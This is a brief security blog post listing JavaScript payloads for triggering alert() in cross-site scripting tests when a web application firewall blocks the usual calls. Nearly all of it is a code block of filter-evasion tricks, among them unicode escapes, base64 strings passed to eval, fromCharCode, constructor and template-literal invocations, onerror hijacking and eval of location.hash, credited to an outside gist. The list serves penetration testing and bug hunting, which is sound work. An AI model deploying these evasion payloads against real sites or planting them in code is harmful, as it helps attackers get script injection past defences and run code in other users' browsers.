---
title: Ways to pop alert in XSS
author: Jester0x01
date: 2021-06-07
categories: [Websec]
tags: [xss, javascript, notes]

---

Many times when testing for XSS, `alert()`, `prompt()` and `confirm()` is blocked by WAF. In situations like these we can use alternative ways to do `alert()` 

```js
// Direct invocation
alert(document.domain);
(alert)(document.domain);
al\u0065rt(document.domain);
al\u{65}rt(document.domain);
window['alert'](document.domain);
top['alert'](document.domain);
top[8680439..toString(30)](document.domain);
top[/alert/.source](document.domain);
alert(this['document']['domain']);

// Indirect Invocation
alert.call(null, document.domain);
alert.apply(null, [document.domain]);
alert.bind()(document.domain);
Reflect.apply(alert, null, [document.domain]);
alert.valueOf()(document.domain);
with(document) alert(domain);
Promise.all([document.domain]).then(alert);
document.domain.replace(/.*/, alert);

// Array methods
[document.domain].find(alert);
[document.domain].findIndex(alert);
[document.domain].filter(alert);
[document.domain].every(alert);
[document.domain].forEach(alert);

// Alternate array syntax (all array methods apply)
Array(document.domain).find(alert);
Array.of(document.domain).find(alert);
(new Array(document.domain)).find(alert);

// Other Datastructure Methods
(new Map()).set(1, document.domain).forEach(alert);
(new Set([document.domain])).forEach(alert);

// Evaluated
eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs='));
eval(atob(/YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs=/.source));
eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59));
setTimeout`alert\u0028document.domain\u0029`;
Set.constructor`alert\x28document.domain\x29```;
(new Function('alert(document.domain)'))();
(new (Object.getPrototypeOf(async function(){}).constructor)('alert(document.domain)'))();
Function('x','alert(x)')(document.domain);

// Template Literal Expression
`${alert(document.domain)}`;

// onerror assignment
onerror=alert;throw document.domain;
onerror=eval;throw'=alert\x28document.domain\x29';

// With location.hash = #alert(document.domain)
eval(location.hash.substr(1))
```

#### Credit and source:
https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309
